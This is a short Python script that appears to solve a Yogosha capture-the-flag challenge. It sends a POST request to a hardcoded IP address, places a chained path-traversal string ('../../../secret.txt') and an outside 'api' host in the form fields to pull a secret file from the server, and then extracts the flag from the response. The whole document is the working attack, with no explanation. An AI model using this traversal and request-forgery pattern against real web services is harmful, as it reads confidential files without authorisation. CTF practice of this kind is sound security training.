#!/usr/bin/python3
from requests import post
from re import findall

url = "http://3.141.159.106/"
headers = {"User-Agent": "Uchiha"}

data = {"submit":'1',"api":"shttp://uchiha.fuinjutsukeeper.tech:5000/","endpoint":"../../../../../../../../../../secret.txt"}

r = post(url + "/guinjutsu.php", headers=headers, data=data)

print(r.text)

print(findall("Yogosha{.*", r.text)[0])